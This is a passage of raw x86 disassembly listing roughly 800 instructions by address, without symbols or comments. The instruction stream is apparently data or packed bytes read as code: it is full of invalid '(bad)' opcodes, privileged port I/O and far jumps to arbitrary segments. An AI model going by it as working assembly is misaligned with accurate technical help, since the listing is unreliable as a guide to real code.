  41a7e3:	lods   eax,DWORD PTR ds:[esi]
  41a7e4:	mov    ecx,0xcdca5d2a
  41a7e9:	in     eax,0x25
  41a7eb:	fcom   QWORD PTR [ecx+0x164b0aed]
  41a7f1:	aaa    
  41a7f2:	scas   eax,DWORD PTR es:[edi]
  41a7f3:	mov    ds:0x25b4abc0,eax
  41a7f8:	je     0x41a77a
  41a7fa:	outs   dx,BYTE PTR ds:[esi]
  41a7fb:	fnstenv ds:0x3802982
  41a801:	in     al,dx
  41a802:	and    esp,DWORD PTR [edi-0x43b74e16]
  41a808:	mov    eax,ds:0x7dc9dbe4
  41a80d:	fiadd  DWORD PTR [eax+0x71bf3a0d]
  41a813:	shl    DWORD PTR [edi-0x6223efcd],cl
  41a819:	mov    bh,0x2e
  41a81b:	(bad)  
  41a81c:	push   eax
  41a81d:	adc    al,0x24
  41a81f:	daa    
  41a820:	shl    bh,cl
  41a822:	leave  
  41a823:	or     esp,DWORD PTR [eax+0x41b59417]
  41a829:	retf   
  41a82a:	mov    ah,0x5b
  41a82c:	xchg   ecx,eax
  41a82d:	lea    edi,[ebx+ebp*1-0x79]
  41a831:	push   edi
  41a832:	retf   
  41a833:	test   DWORD PTR [eax-0x14],edi
  41a836:	js     0x41a873
  41a838:	mov    al,0x51
  41a83a:	jecxz  0x41a7cc
  41a83c:	lods   eax,DWORD PTR ds:[esi]
  41a83d:	(bad)  
  41a83e:	jp     0x41a7cd
  41a840:	pop    edi
  41a841:	adc    al,0x42
  41a843:	aad    0x12
  41a845:	lods   eax,DWORD PTR ds:[esi]
  41a846:	or     ebx,DWORD PTR [ebx+0x79]
  41a849:	into   
  41a84a:	aaa    
  41a84b:	add    cl,BYTE PTR [esi+ebp*8]
  41a84e:	retf   
  41a84f:	cdq    
  41a850:	inc    edx
  41a851:	xchg   al,ch
  41a853:	dec    ebp
  41a854:	dec    edi
  41a855:	pop    edx
  41a856:	shr    BYTE PTR [edi-0x73668d0e],1
  41a85c:	mov    ebx,ecx
  41a85e:	test   ecx,0x89b817bd
  41a864:	mov    ds:0x56265783,eax
  41a869:	inc    ebx
  41a86a:	jg     0x41a870
  41a86c:	stos   DWORD PTR es:[edi],eax
  41a86d:	cmc    
  41a86e:	(bad)  
  41a86f:	js     0x41a8a8
  41a871:	in     eax,0x31
  41a873:	sbb    edi,esp
  41a875:	jo     0x41a8f0
  41a877:	scas   al,BYTE PTR es:[edi]
  41a878:	fs push eax
  41a87a:	fldln2 
  41a87c:	aas    
  41a87d:	mov    edx,0xf78111cc
  41a882:	sahf   
  41a883:	cwde   
  41a884:	inc    ebx
  41a885:	scas   eax,DWORD PTR es:[edi]
  41a886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a887:	jle    0x41a886
  41a889:	mov    ebx,0xfc51bd23
  41a88e:	enter  0x7ce8,0x6c
  41a892:	jno    0x41a902
  41a894:	mov    al,ds:0x9309f058
  41a899:	dec    ebx
  41a89a:	xor    al,dh
  41a89c:	cmp    DWORD PTR [ecx-0x5e7af96b],0xffffffe1
  41a8a3:	jl     0x41a89e
  41a8a5:	mov    DWORD PTR [esi-0x767e7c8a],esi
  41a8ab:	ins    DWORD PTR es:[edi],dx
  41a8ac:	out    dx,al
  41a8ad:	sub    al,0xb8
  41a8af:	cwde   
  41a8b0:	push   esp
  41a8b1:	mov    dh,dl
  41a8b3:	jno    0x41a846
  41a8b5:	sub    BYTE PTR [edx],dl
  41a8b7:	(bad)
  41a8ba:	cmp    esi,DWORD PTR [ebx-0x1cf75106]
  41a8c0:	add    ah,BYTE PTR [ebp-0x1d436b2]
  41a8c6:	jbe    0x41a90c
  41a8c8:	jmp    0x367b:0xbfff66c1
  41a8cf:	cmp    dl,0xb8
  41a8d2:	rol    DWORD PTR [esi+0x298866fc],0xcf
  41a8d9:	or     bl,bl
  41a8db:	ror    BYTE PTR [edx],0x33
  41a8de:	stos   BYTE PTR es:[edi],al
  41a8df:	mov    DWORD PTR [edi+edi*4+0x45001370],esp
  41a8e6:	dec    edi
  41a8e7:	lock inc esi
  41a8e9:	(bad)
  41a8ec:	mov    ebx,0x579ea004
  41a8f1:	and    al,0xbd
  41a8f3:	cmp    DWORD PTR [ecx],ecx
  41a8f5:	sbb    BYTE PTR [edx+0x20],0x67
  41a8f9:	bound  ebp,QWORD PTR [esi]
  41a8fb:	jl     0x41a89e
  41a8fd:	hlt    
  41a8fe:	test   al,0x71
  41a900:	mov    ds:0xd86fc85f,al
  41a905:	popf   
  41a906:	dec    ecx
  41a907:	and    BYTE PTR [ebx],cl
  41a909:	(bad)  
  41a90a:	sub    edi,esp
  41a90c:	pop    esi
  41a90d:	cmp    eax,0xc03500cd
  41a912:	sbb    BYTE PTR [eax],dl
  41a914:	ffreep st(5)
  41a916:	add    al,0xc0
  41a918:	lock dec ebx
  41a91a:	xchg   esp,eax
  41a91b:	ror    ecx,0xa1
  41a91e:	sub    DWORD PTR [edx-0x53],ebp
  41a921:	sub    dh,BYTE PTR [esi]
  41a923:	iret   
  41a924:	int    0xff
  41a926:	call   0xdd47:0x88eb9c9c
  41a92d:	mov    ebp,0x8cacab5b
  41a932:	sub    dl,BYTE PTR [esi+0x66]
  41a935:	call   0x12455dd1
  41a93a:	jnp    0x41a8df
  41a93c:	push   ecx
  41a93d:	inc    esp
  41a93e:	and    BYTE PTR [eax-0x161574f4],bl
  41a944:	xchg   ebx,eax
  41a945:	aaa    
  41a946:	rcr    bh,1
  41a948:	or     al,0xe0
  41a94a:	pushf  
  41a94b:	push   0xb
  41a94d:	cs dec ebx
  41a94f:	pop    ebx
  41a950:	xor    al,0xa4
  41a952:	bound  esp,QWORD PTR [ebx-0x23]
  41a955:	xchg   esp,eax
  41a956:	and    eax,0x72ed8537
  41a95b:	icebp  
  41a95c:	test   ecx,ebx
  41a95e:	inc    eax
  41a95f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a960:	dec    edi
  41a961:	pop    edi
  41a962:	outs   dx,DWORD PTR ds:[esi]
  41a963:	adc    BYTE PTR [ebx+0x2d],cl
  41a966:	dec    ecx
  41a967:	lahf   
  41a968:	clc    
  41a969:	and    BYTE PTR [ebx+esi*1],al
  41a96c:	sahf   
  41a96d:	ficom  DWORD PTR [ebx-0x23]
  41a970:	fsub   st(2),st
  41a972:	lds    esp,FWORD PTR [esp+ecx*1-0x57]
  41a976:	push   edi
  41a977:	aam    0xd
  41a979:	xlat   BYTE PTR ds:[ebx]
  41a97a:	add    eax,0xac5c09c1
  41a97f:	mov    eax,0xfbf5b374
  41a984:	and    eax,DWORD PTR [eax-0x2fc82afd]
  41a98a:	retf   0xa3ff
  41a98d:	mov    dh,0x8d
  41a98f:	mov    bh,0xb9
  41a991:	inc    DWORD PTR [edi+0x294414d5]
  41a997:	mov    esi,0x46a6f445
  41a99c:	add    eax,0xe287877b
  41a9a1:	xor    al,BYTE PTR [edi+0x1fd07fe1]
  41a9a7:	push   edx
  41a9a8:	pop    eax
  41a9a9:	xor    DWORD PTR [esi-0x24],ebp
  41a9ac:	fidivr WORD PTR [edx-0x70]
  41a9af:	sbb    ecx,DWORD PTR [esi+0x6]
  41a9b2:	test   DWORD PTR [ebp-0x32e436c2],edx
  41a9b8:	jmp    0x41a97c
  41a9ba:	cmp    bh,BYTE PTR [edi-0x4f]
  41a9bd:	inc    ebx
  41a9be:	pusha  
  41a9bf:	inc    eax
  41a9c0:	les    edx,FWORD PTR [esi+0x583fcbdb]
  41a9c6:	jae    0x41aa39
  41a9c8:	push   ss
  41a9c9:	mov    al,ds:0xc9616384
  41a9ce:	xor    BYTE PTR [ebx-0x4f],ch
  41a9d1:	ja     0x41a9f2
  41a9d3:	nop
  41a9d4:	mov    al,0xea
  41a9d6:	fadd   st(2),st
  41a9d8:	inc    edi
  41a9d9:	pop    esi
  41a9da:	dec    ebx
  41a9db:	call   0x69a0:0xb31020be
  41a9e2:	rcl    DWORD PTR [ebp+0x2c],0xd4
  41a9e6:	daa    
  41a9e7:	adc    DWORD PTR [edi-0x6611e25f],0x75
  41a9ee:	adc    eax,0xaf06ddc7
  41a9f3:	rol    BYTE PTR [ebx+0x34],1
  41a9f6:	rep outs dx,DWORD PTR ds:[esi]
  41a9f8:	sbb    BYTE PTR [ecx-0x1],al
  41a9fb:	and    al,0xff
  41a9fd:	push   esp
  41a9fe:	xchg   edx,eax
  41a9ff:	add    eax,0x1b2cd5a3
  41aa04:	mov    edi,DWORD PTR ds:0x4bb9a21
  41aa0a:	lahf   
  41aa0b:	jo     0x41a9e9
  41aa0d:	sub    eax,0xa29db4ca
  41aa12:	inc    edx
  41aa13:	loope  0x41aa31
  41aa15:	fwait
  41aa16:	stos   BYTE PTR es:[edi],al
  41aa17:	mov    dl,BYTE PTR [edi]
  41aa19:	and    BYTE PTR ds:0x350fb540,bh
  41aa1f:	daa    
  41aa20:	sub    ebp,DWORD PTR [ebx-0x23]
  41aa23:	sbb    bl,bh
  41aa25:	icebp  
  41aa26:	xor    BYTE PTR [esi+ecx*8+0x7a31012f],bh
  41aa2d:	clc    
  41aa2e:	push   0xffffffb7
  41aa30:	addr16 pop ebp
  41aa32:	push   edi
  41aa33:	test   eax,0x1ba6b51
  41aa38:	loope  0x41aa42
  41aa3a:	jnp    0x41aa9b
  41aa3c:	int    0xa
  41aa3e:	push   0x12813b7a
  41aa43:	xchg   ebp,eax
  41aa44:	xchg   ebp,eax
  41aa45:	or     BYTE PTR [esi-0xe],0x81
  41aa49:	iret   
  41aa4a:	aam    0x60
  41aa4c:	pushf  
  41aa4d:	xchg   edx,eax
  41aa4e:	arpl   WORD PTR [edi+ebx*4+0x50ef16d5],sp
  41aa55:	jecxz  0x41aa71
  41aa57:	nop
  41aa58:	cmp    esi,ebx
  41aa5a:	out    dx,al
  41aa5b:	fs or  dh,ch
  41aa5e:	pop    esp
  41aa5f:	pop    eax
  41aa60:	pop    ds
  41aa61:	pop    ebx
  41aa62:	dec    ecx
  41aa63:	or     al,0x4e
  41aa65:	mov    es,eax
  41aa67:	or     ah,BYTE PTR [eax+0x251de1b0]
  41aa6d:	fsubr  st,st(2)
  41aa6f:	mov    esp,0x8c0e2057
  41aa74:	push   0x2a
  41aa76:	stc    
  41aa77:	jl     0x41aabc
  41aa79:	mov    ebx,0x5d785287
  41aa7e:	mov    al,0xa0
  41aa80:	jns    0x41aaef
  41aa82:	mov    eax,ds:0x87cedc98
  41aa87:	jb     0x41aac8
  41aa89:	dec    esi
  41aa8a:	add    ch,BYTE PTR [edi-0x1e72f8ea]
  41aa90:	dec    ebp
  41aa91:	sbb    eax,0xff85a92b
  41aa96:	in     al,dx
  41aa97:	mov    edx,0x19d981d3
  41aa9c:	sub    eax,0x30cc0ee1
  41aaa1:	jge    0x41aaee
  41aaa3:	in     eax,dx
  41aaa4:	push   esp
  41aaa5:	adc    al,0xb9
  41aaa7:	mov    eax,ds:0x54244c35
  41aaac:	jmp    0x1b:0x4e0058c8
  41aab3:	dec    ebx
  41aab4:	push   ds
  41aab5:	addr16 into 
  41aab7:	jbe    0x41aab6
  41aab9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaba:	aaa    
  41aabb:	inc    ebx
  41aabc:	push   edi
  41aabd:	or     edx,DWORD PTR [esi]
  41aabf:	int3   
  41aac0:	xor    ecx,DWORD PTR [ebx+0x73]
  41aac3:	jecxz  0x41aaed
  41aac5:	or     al,0x94
  41aac7:	mov    ds:0xb8cf2347,al
  41aacc:	and    dl,BYTE PTR [edi-0x6]
  41aacf:	clc    
  41aad0:	push   edi
  41aad1:	daa    
  41aad2:	sbb    BYTE PTR [edx-0x7f],dl
  41aad5:	enter  0x678b,0x9b
  41aad9:	iret   
  41aada:	cmp    bh,BYTE PTR [edx]
  41aadc:	out    dx,eax
  41aadd:	dec    ebx
  41aade:	addr16 mov dl,0xa3
  41aae1:	lea    esi,[eax+0x325a69ad]
  41aae7:	enter  0x25f2,0x5f
  41aaeb:	jp     0x41aaa0
  41aaed:	push   esi
  41aaee:	mov    edi,0xb45b6b59
  41aaf3:	sahf   
  41aaf4:	sub    al,0xd7
  41aaf6:	and    al,al
  41aaf8:	shl    BYTE PTR [ebp-0x59],0x8f
  41aafc:	dec    eax
  41aafd:	std    
  41aafe:	push   ebx
  41aaff:	popa   
  41ab00:	jle    0x41ab30
  41ab02:	fisub  DWORD PTR [di]
  41ab05:	cwde   
  41ab06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab07:	push   ds
  41ab08:	jp     0x41aaf7
  41ab0a:	fbstp  TBYTE PTR [esi+0x20a6b850]
  41ab10:	cld    
  41ab11:	and    al,0xa5
  41ab13:	sub    eax,0xe4a09132
  41ab18:	fstp   QWORD PTR [edx]
  41ab1a:	mov    al,ds:0xa30bfb10
  41ab1f:	stos   DWORD PTR es:[edi],eax
  41ab20:	cdq    
  41ab21:	mov    WORD PTR [esi],ds
  41ab23:	enter  0xb441,0x0
  41ab27:	clc    
  41ab28:	cmp    al,0x5b
  41ab2a:	xchg   ebx,eax
  41ab2b:	and    cl,dh
  41ab2d:	mov    fs,WORD PTR [ebx-0x6f5cd9f2]
  41ab33:	jg     0x41aac9
  41ab35:	cli    
  41ab36:	aaa    
  41ab37:	sub    esi,edx
  41ab39:	ds ins BYTE PTR es:[edi],dx
  41ab3b:	xchg   edi,eax
  41ab3c:	mov    al,0xb9
  41ab3e:	fs stos BYTE PTR es:[edi],al
  41ab40:	jg     0x41aae5
  41ab42:	adc    edx,edi
  41ab44:	add    BYTE PTR [edi],bl
  41ab46:	retf   
  41ab47:	jns    0x41aba4
  41ab49:	dec    ebx
  41ab4a:	xchg   edx,eax
  41ab4b:	(bad)  {k2}
  41ab50:	push   es
  41ab51:	mov    esp,cs
  41ab53:	push   esp
  41ab54:	scas   eax,DWORD PTR es:[edi]
  41ab55:	push   es
  41ab56:	out    dx,al
  41ab57:	bound  ecx,QWORD PTR [ebp*1-0x1c0e9346]
  41ab5e:	ficomp DWORD PTR [edi-0x2d]
  41ab61:	jnp    0x41ab9b
  41ab63:	dec    edx
  41ab64:	inc    ebp
  41ab65:	in     al,0xe0
  41ab67:	lods   eax,DWORD PTR ds:[esi]
  41ab68:	sbb    DWORD PTR [edx-0x7c866459],edi
  41ab6e:	jo     0x41abd4
  41ab70:	fistp  QWORD PTR [esi+ebp*8]
  41ab73:	mov    eax,ds:0x5b7374d6
  41ab78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab79:	enter  0x8938,0x22
  41ab7d:	cmp    BYTE PTR [esi],dh
  41ab7f:	ret    0xa067
  41ab82:	mov    ebx,0x326db249
  41ab87:	jmp    0x734ac842
  41ab8c:	mov    edi,0x348beb00
  41ab91:	jnp    0x41abbd
  41ab93:	sbb    bh,ch
  41ab95:	push   0xd92d88e4
  41ab9a:	xchg   edx,eax
  41ab9b:	iret   
  41ab9c:	les    ecx,FWORD PTR [ecx]
  41ab9e:	xchg   DWORD PTR [ebp+0x20d3312],ebx
  41aba4:	dec    edx
  41aba5:	mov    ch,0x5
  41aba7:	cmc    
  41aba8:	mov    ecx,0x9d31512e
  41abad:	shr    BYTE PTR [edx],1
  41abaf:	mov    cl,0x9
  41abb1:	cdq    
  41abb2:	rcr    DWORD PTR [eax],1
  41abb4:	mov    bh,0x2e
  41abb6:	jns    0x41ab4f
  41abb8:	sar    BYTE PTR [edx-0xe455a04],cl
  41abbe:	adc    ebx,eax
  41abc0:	xor    DWORD PTR [edi+eiz*4+0x42a03b23],edx
  41abc7:	lods   al,BYTE PTR ds:[esi]
  41abc8:	not    esi
  41abca:	or     dh,BYTE PTR [ebx-0x4cc019da]
  41abd0:	(bad)  
  41abd1:	xchg   esi,eax
  41abd2:	or     eax,0xb17a8533
  41abd7:	outs   dx,DWORD PTR ds:[esi]
  41abd8:	jmp    0x23ea:0x86628784
  41abdf:	dec    ebx
  41abe0:	cmp    ecx,DWORD PTR [ecx+0x6944ecb8]
  41abe6:	test   BYTE PTR [ecx+0x4ad93e6a],ah
  41abec:	add    DWORD PTR [esi+0x5d],edx
  41abef:	call   eax
  41abf1:	mov    al,0x25
  41abf3:	jg     0x41ac19
  41abf5:	jmp    0x5c1:0x48b5887f
  41abfc:	jl     0x41ac76
  41abfe:	in     al,0x9e
  41ac00:	les    ebp,FWORD PTR [ebp+0x6e71b503]
  41ac06:	div    DWORD PTR [edi-0x4b]
  41ac09:	jl     0x41ac65
  41ac0b:	sub    eax,0xd479513a
  41ac10:	jl     0x41ac47
  41ac12:	lds    edx,FWORD PTR [eax-0x33]
  41ac15:	dec    eax
  41ac16:	or     al,0x14
  41ac18:	or     al,0xe4
  41ac1a:	mov    edi,0x32fce88a
  41ac1f:	inc    ecx
  41ac20:	and    al,0x91
  41ac22:	cdq    
  41ac23:	adc    eax,0x85aca44d
  41ac28:	jne    0x41ac89
  41ac2a:	mov    bl,0x87
  41ac2c:	add    ebp,DWORD PTR [ebx-0x6fdc4efe]
  41ac32:	sti    
  41ac33:	in     al,dx
  41ac34:	mov    bl,0xa8
  41ac36:	sub    bh,BYTE PTR [ebx]
  41ac38:	sub    al,0x35
  41ac3a:	xor    edi,DWORD PTR [esi-0x34ed7fe8]
  41ac40:	jecxz  0x41ac0f
  41ac42:	fnstcw WORD PTR [edi-0x2]
  41ac45:	sti    
  41ac46:	cs aad 0x62
  41ac49:	push   ss
  41ac4a:	cld    
  41ac4b:	add    al,0xfe
  41ac4d:	or     edi,0x5fac1bac
  41ac53:	jmp    0x3ead:0x2103a511
  41ac5a:	push   cs
  41ac5b:	mov    ah,0x28
  41ac5d:	loope  0x41acba
  41ac5f:	add    al,0x27
  41ac61:	jns    0x41acb6
  41ac63:	mov    cs,eax
  41ac65:	mov    dl,BYTE PTR [ebx+0x6e36fe57]
  41ac6b:	cmp    BYTE PTR [eax],dl
  41ac6d:	aaa    
  41ac6e:	pop    es
  41ac6f:	sub    eax,0x5404f72e
  41ac74:	aad    0x34
  41ac76:	jbe    0x41ac0d
  41ac78:	push   0xffffff9e
  41ac7a:	rcl    ah,1
  41ac7c:	retf   
  41ac7d:	icebp  
  41ac7e:	dec    esi
  41ac7f:	mov    gs,WORD PTR [ebx]
  41ac81:	fs xchg edi,eax
  41ac83:	int    0x40
  41ac85:	inc    esi
  41ac86:	or     DWORD PTR [ebx+0x5a],ecx
  41ac89:	dec    esp
  41ac8a:	pop    ds
  41ac8b:	mov    al,0xc0
  41ac8d:	fcom   DWORD PTR [ecx+0xd8bd9a5]
  41ac93:	scas   eax,DWORD PTR es:[edi]
  41ac94:	cdq    
  41ac95:	dec    eax
  41ac96:	push   esp
  41ac97:	sub    DWORD PTR [ecx-0x5c07f3bd],0x691f0f58
  41aca1:	ss out dx,al
  41aca3:	pop    ebp
  41aca4:	loopne 0x41ac3a
  41aca6:	inc    esp
  41aca7:	lds    ecx,FWORD PTR [ecx-0x2e40ec4f]
  41acad:	mov    ah,0xd6
  41acaf:	mov    edx,DWORD PTR [edi-0x47]
  41acb2:	shr    esi,0x25
  41acb5:	jmp    FWORD PTR [edx-0xf]
  41acb8:	cmp    cl,dl
  41acba:	dec    ebp
  41acbb:	or     eax,0xf7999eb2
  41acc0:	jl     0x41ace2
  41acc2:	loope  0x41acf3
  41acc4:	add    eax,0xe69d42ea
  41acc9:	pop    ecx
  41acca:	lds    edi,FWORD PTR [ebx-0x2a]
  41accd:	jmp    0x41ac8b
  41accf:	cmp    BYTE PTR [edi+0x19efd3e5],dh
  41acd5:	sbb    al,al
  41acd7:	add    esi,DWORD PTR [edi+0x22]
  41acda:	mov    edi,0x704ebfe0
  41acdf:	jl     0x41ad0b
  41ace1:	inc    esp
  41ace2:	out    dx,al
  41ace3:	sar    BYTE PTR [ecx+edx*1+0x75b9f0c9],cl
  41acea:	(bad)  
  41aceb:	push   cs
  41acec:	dec    edi
  41aced:	pop    eax
  41acee:	jecxz  0x41acd9
  41acf0:	test   al,0x49
  41acf2:	mov    al,al
  41acf4:	test   al,0x4f
  41acf6:	fild   QWORD PTR [ebx+0x69ce82fb]
  41acfc:	in     al,dx
  41acfd:	ins    BYTE PTR es:[edi],dx
  41acfe:	add    BYTE PTR [esi+0x41],dl
  41ad01:	loope  0x41ad00
  41ad03:	dec    ebx
  41ad04:	inc    ebp
  41ad05:	or     eax,0x32004f6c
  41ad0a:	inc    ebp
  41ad0b:	mov    BYTE PTR [edi+ebp*2+0x4ff5481b],0x2c
  41ad13:	adc    bh,BYTE PTR [ebx]
  41ad15:	fist   WORD PTR [ebx+ecx*2]
  41ad18:	jp     0x41ad69
  41ad1a:	(bad)  
  41ad1b:	mov    edx,0x847864d
  41ad20:	iret   
  41ad21:	repz add BYTE PTR [ebp+0x2cb590a6],dl
  41ad28:	leave  
  41ad29:	and    BYTE PTR ds:0xda8f9705,0x41
  41ad30:	add    edi,DWORD PTR [esi]
  41ad32:	inc    esp
  41ad33:	fwait
  41ad34:	(bad)  
  41ad35:	pop    edx
  41ad36:	jae    0x41acd7
  41ad38:	jmp    0x41ad75
  41ad3a:	sti    
  41ad3b:	rcl    BYTE PTR ds:0xf93ec523,0xbb
  41ad42:	inc    edx
  41ad43:	sub    eax,0xf401e1b4
  41ad48:	dec    ebp
  41ad49:	popf   
  41ad4a:	rol    bl,1
  41ad4c:	jp     0x41ad55
  41ad4e:	xchg   esi,eax
  41ad4f:	test   DWORD PTR [eax],esp
  41ad51:	iret   
  41ad52:	mov    ds:0xb5e73104,al
  41ad57:	dec    ecx
  41ad58:	lods   al,BYTE PTR ds:[esi]
  41ad59:	push   0xfffffff2
  41ad5b:	test   al,0x73
  41ad5d:	lds    ecx,FWORD PTR [ebp+0x3d9ff50b]
  41ad63:	xchg   ebp,eax
  41ad64:	xor    DWORD PTR [edi+0x5ef880d2],eax
  41ad6a:	mov    eax,ds:0xa7f1a599
  41ad6f:	mov    dl,bh
  41ad71:	add    al,0x8a
  41ad73:	push   0x8780b348
  41ad78:	push   ss
  41ad79:	jl     0x41ad0d
  41ad7b:	rol    BYTE PTR [edx],1
  41ad7d:	and    DWORD PTR [edi-0x7f2145b8],edx
  41ad83:	jecxz  0x41ad58
  41ad85:	mov    eax,ds:0x1e40654b
  41ad8a:	cmp    bl,bl
  41ad8c:	pop    esi
  41ad8d:	inc    esi
  41ad8e:	sub    BYTE PTR [edx],0x7d
  41ad91:	bound  ebp,QWORD PTR [edi-0x62]
  41ad94:	ins    DWORD PTR es:[edi],dx
  41ad95:	or     dh,ah
  41ad97:	xchg   ebx,eax
  41ad98:	in     eax,0x5e
  41ad9a:	dec    ecx
  41ad9b:	ficom  WORD PTR [ecx]
  41ad9d:	gs mov edx,0xdb0d87aa
  41ada3:	mov    ds:0x3a5e3bf4,eax
  41ada8:	retf   
  41ada9:	ja     0x41adfe
  41adab:	out    0x21,eax
  41adad:	je     0x41ad3a
  41adaf:	mov    ch,0x6d
  41adb1:	inc    esp
  41adb2:	mov    al,0x48
  41adb4:	cmp    al,0xc7
  41adb6:	jnp    0x41adc7
  41adb8:	jl     0x41adbc
  41adba:	fs inc edx
  41adbc:	loopne 0x41ad54
  41adbe:	add    esp,0xe0ec0ad0
  41adc4:	or     cl,BYTE PTR [ebp-0x1a]
  41adc7:	(bad)  
  41adc8:	call   0x1f9ab519
  41adcd:	adc    esi,DWORD PTR [edx+0x63]
  41add0:	int3   
  41add1:	cmp    BYTE PTR [edi+0x43],cl
  41add4:	enter  0xf297,0x8e
  41add8:	sbb    al,0x47
  41adda:	outs   dx,BYTE PTR ds:[esi]
  41addb:	push   ss
  41addc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41addd:	xchg   edx,eax
  41adde:	(bad)  
  41addf:	jmp    0x8e70:0x555287ec
  41ade6:	cli    
  41ade7:	fs dec ecx
  41ade9:	adc    DWORD PTR [ebx-0x32],esp
  41adec:	fnstenv [eax-0x45]
  41adef:	and    ebx,edx
  41adf1:	out    dx,eax
  41adf2:	ret    
  41adf3:	pop    ebx
  41adf4:	iret   
  41adf5:	cmp    dl,BYTE PTR [ebx]
  41adf7:	js     0x41ad98
  41adf9:	xchg   edx,eax
  41adfa:	jae    0x41add0
  41adfc:	xchg   edi,eax
  41adfd:	lods   al,BYTE PTR ds:[esi]
  41adfe:	pushf  
  41adff:	in     al,0x35
  41ae01:	dec    ebp
  41ae02:	jg     0x41ada4
  41ae04:	and    eax,0xca6b5be0
  41ae09:	(bad)  
  41ae0a:	in     al,dx
  41ae0b:	in     eax,0xad
  41ae0d:	cmp    eax,0x72730781
  41ae12:	test   eax,0xd57d5a40
  41ae17:	stc    
  41ae18:	mov    DWORD PTR [edx+0x169c7ebf],ecx
  41ae1e:	pop    esp
  41ae1f:	jecxz  0x41ae97
  41ae21:	adc    bh,bl
  41ae23:	dec    ecx
  41ae24:	loop   0x41addd
  41ae26:	or     ebp,DWORD PTR [edi-0x10c60be]
  41ae2c:	cmc    
  41ae2d:	fwait
  41ae2e:	mov    cl,0x59
  41ae30:	iret   
  41ae31:	sahf   
  41ae32:	mov    DWORD PTR ss:[edi-0x66],esp
  41ae36:	push   edi
  41ae37:	push   esp
  41ae38:	test   al,0xc
  41ae3a:	add    eax,0x8a06cfea
  41ae3f:	loopne 0x41ae1e
  41ae41:	push   ecx
  41ae42:	cmp    BYTE PTR [ebx-0x1a],bl
  41ae45:	stos   BYTE PTR es:[edi],al
  41ae46:	bound  eax,QWORD PTR [ebp-0x21]
  41ae49:	pop    edx
  41ae4a:	into   
  41ae4b:	add    DWORD PTR ds:0x1f568a15,eax
  41ae51:	inc    edx
  41ae52:	scas   al,BYTE PTR es:[edi]
  41ae53:	in     al,dx
  41ae54:	mov    ecx,0x5720e5ce
  41ae59:	dec    DWORD PTR [eax-0x6d9681e2]
  41ae5f:	inc    esi
  41ae60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae61:	mov    esp,0x7a839f12
  41ae66:	mov    WORD PTR [eax+0x5e],es
  41ae69:	mov    ebp,0xa7625253
  41ae6e:	jo     0x41ae2a
  41ae70:	ret    0xea53
  41ae73:	jp     0x41ae4e
  41ae75:	dec    ecx
  41ae76:	lods   eax,DWORD PTR ds:[esi]
  41ae77:	fdivr  QWORD PTR [ebx-0x598449e5]
  41ae7d:	lds    ebp,FWORD PTR [edi]
  41ae7f:	inc    esi
  41ae80:	ins    DWORD PTR es:[edi],dx
  41ae81:	xor    BYTE PTR [edx+0x62],dl
  41ae84:	mov    al,ds:0x910d49b2
  41ae89:	rcr    dh,1
  41ae8b:	ss cld 
  41ae8d:	mov    edi,ds
  41ae8f:	cld    
  41ae90:	push   edi
  41ae91:	cwde   
  41ae92:	dec    ah
  41ae94:	test   DWORD PTR [ecx],0xa9965e1f
  41ae9a:	pop    ebp
  41ae9b:	iret   
  41ae9c:	xchg   DWORD PTR [edx],edi
  41ae9e:	xchg   edi,eax
  41ae9f:	cli    
  41aea0:	mov    edi,0x465ff9c
  41aea5:	jmp    0xc3a41ce8
  41aeaa:	mov    ch,0x46
  41aeac:	mov    esp,0xb5c531a4
  41aeb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeb2:	ficom  WORD PTR [ecx-0x6113b5c]
  41aeb8:	int    0x20
  41aeba:	les    ebx,FWORD PTR [edx-0x6d]
  41aebd:	aaa    
  41aebe:	sub    eax,0xb3332ee8
  41aec3:	mov    fs,WORD PTR [eax]
  41aec5:	ds loop 0x41af3b
  41aec8:	jmp    0x1431:0xafa9a6c5
  41aecf:	and    eax,0x295dd6cd
  41aed4:	mov    eax,ds:0x36c9ddaa
  41aed9:	mov    eax,0x51177bd0
  41aede:	dec    edx
  41aedf:	dec    esi
  41aee0:	jnp    0x41af04
  41aee2:	jl     0x41aeb5
  41aee4:	dec    ebx
  41aee5:	dec    ebp
  41aee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aee7:	and    ebp,esi
  41aee9:	jge    0x41ae75
  41aeeb:	bnd jae 0x41ae80
  41aeee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aeef:	add    esp,edi
  41aef1:	mov    al,ds:0x7abdd770
  41aef6:	daa    
  41aef7:	xor    ebx,ebx
  41aef9:	ret    0x9630
  41aefc:	aam    0xbb
  41aefe:	push   ecx
  41aeff:	push   ebp
  41af00:	test   al,0xd4
  41af02:	arpl   di,sp
  41af04:	in     al,dx
  41af05:	xchg   ebx,eax
  41af06:	das    
  41af07:	shl    BYTE PTR [ecx-0xc257477],0xc8
  41af0e:	ds push 0xffffff95
  41af11:	lock retf 0x364f
  41af15:	inc    edi
  41af16:	or     ch,ch
  41af18:	jo     0x41aee4
  41af1a:	mov    ebx,0x3242b6c4
  41af1f:	sub    al,0x78
  41af21:	jmp    0x4da5:0x293ae6a3
  41af28:	arpl   WORD PTR [ebx+0x18f41f40],cx
  41af2e:	fwait
  41af2f:	pop    ds
  41af30:	aad    0x13
  41af32:	or     BYTE PTR [eax+0x18],0x60
  41af36:	popa   
  41af37:	(bad)  
  41af38:	mov    DWORD PTR [ebx],edx
  41af3a:	sti    
  41af3b:	and    DWORD PTR [esi+0x4476c91a],ebp
  41af41:	inc    esi
  41af42:	push   0x26
  41af44:	push   edx
  41af45:	inc    ecx
  41af46:	and    BYTE PTR [eax-0x4fc80563],al
  41af4c:	or     al,0xee
  41af4e:	(bad)  
  41af4f:	into   
  41af50:	push   0xffffffdb
  41af52:	aam    0xdf
  41af54:	cmp    al,0x7f
  41af56:	cdq    
  41af57:	or     eax,0x9fad70ed
  41af5c:	shr    DWORD PTR [eiz*2+0x18f50abc],1
  41af63:	ins    BYTE PTR es:[edi],dx
  41af64:	cmp    DWORD PTR [esp+edx*8-0x106274d7],ebp
